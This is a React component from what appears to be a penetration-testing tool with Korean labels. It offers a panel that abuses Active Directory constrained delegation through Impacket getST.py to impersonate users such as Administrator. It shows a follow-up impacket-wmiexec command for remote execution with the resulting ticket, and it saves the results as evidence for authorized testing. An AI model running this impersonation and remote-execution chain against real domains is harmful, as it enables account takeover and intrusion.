import { useState } from "react";

export type DelegationExecution = {
  id: number; template_id: string; status: string;
  stdout?: string; stderr?: string;
};
export type DelegationRunState = {
  id?: number; templateId: string; status: string; stdout?: string; stderr?: string;
};

// An account with AllowedToDelegateTo (constrained delegation) can use
// S4U2Self/S4U2Proxy to impersonate any user (typically Administrator)
// against the specific target SPN it's trusted for — a distinct ticket
// primitive from the silver ticket forging above (that needs an NTLM hash
// + domain SID; this needs the delegation account's own password/hash and
// the SPN it's allowed to delegate to). Impacket's getST.py already
// implements S4U2Self/S4U2Proxy correctly, so this just wraps it.
export default function ConstrainedDelegationPanel({
  target, runState, serviceExecutions, evidenceMsg, onRequest, onCaptureEvidence,
}: {
  target?: { ip: string };
  runState?: DelegationRunState;
  serviceExecutions: DelegationExecution[];
  evidenceMsg: string;
  onRequest: (fields: {
    spn: string; targetUsername: string; domain: string; username: string; password: string;
  }) => void;
  onCaptureEvidence: (
    execution: { id: number; stdout?: string; stderr?: string }, title: string,
  ) => void;
}) {
  const [spn, setSpn] = useState("");
  const [targetUsername, setTargetUsername] = useState("administrator");
  const [domain, setDomain] = useState("");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const delegationRunState =
    runState?.templateId === "ad-constrained-delegation-getst" ? runState : undefined;
  const latest = serviceExecutions
    .filter((item) => item.template_id === "ad-constrained-delegation-getst"
      && item.status === "completed")
    .sort((a, b) => b.id - a.id)[0];
  const busy = !!delegationRunState && ["starting", "running"].includes(delegationRunState.status);
  const activeExecution = delegationRunState?.id
    ? { id: delegationRunState.id, stdout: delegationRunState.stdout, stderr: delegationRunState.stderr }
    : latest
      ? { id: latest.id, stdout: latest.stdout, stderr: latest.stderr }
      : undefined;
  const ready = spn.trim() && targetUsername.trim() && domain.trim()
    && username.trim() && password.trim();
  const savedCcache = activeExecution?.stdout?.match(/Saving ticket in (\S+\.ccache)/)?.[1];

  return (
    <section className="netexecCredCheck" aria-labelledby="constrained-delegation-heading">
      <header>
        <h2 id="constrained-delegation-heading">제한된 위임 남용 (Impacket getST.py)</h2>
      </header>
      <div className="netexecCredForm netexecCredForm--save">
        <input value={spn} onChange={(e) => setSpn(e.target.value)}
          placeholder="SPN (예: cifs/dc01.domain)" aria-label="SPN" />
        <input value={targetUsername} onChange={(e) => setTargetUsername(e.target.value)}
          placeholder="사칭할 사용자명" aria-label="사칭할 사용자명" />
        <input value={domain} onChange={(e) => setDomain(e.target.value)}
          placeholder="도메인" aria-label="도메인" />
        <input value={username} onChange={(e) => setUsername(e.target.value)}
          placeholder="위임 계정 사용자명 (예: svc_int$)" aria-label="위임 계정 사용자명" />
        <input value={password} onChange={(e) => setPassword(e.target.value)}
          placeholder="위임 계정 비밀번호/NTLM 해시" aria-label="위임 계정 비밀번호" />
        <button disabled={busy || !ready} onClick={() => onRequest({
          spn: spn.trim(), targetUsername: targetUsername.trim(), domain: domain.trim(),
          username: username.trim(), password: password.trim(),
        })}>
          {busy ? "요청 중…" : "위임 티켓 요청"}
        </button>
      </div>
      {activeExecution && (
        <div className="intruderResults">
          <pre>{activeExecution.stdout}</pre>
          {savedCcache && (
            <p>티켓 저장됨: <code>{savedCcache}</code> — 예:
              <code>KRB5CCNAME={savedCcache} impacket-wmiexec -k -no-pass {target?.ip}</code></p>
          )}
          <button onClick={() => onCaptureEvidence(
            activeExecution, `제한된 위임 남용 · ${targetUsername || "unknown"}@${target?.ip}`,
          )}>Evidence로 저장</button>
          {evidenceMsg && <p className="netexecEvidenceMsg">{evidenceMsg}</p>}
        </div>
      )}
    </section>
  );
}
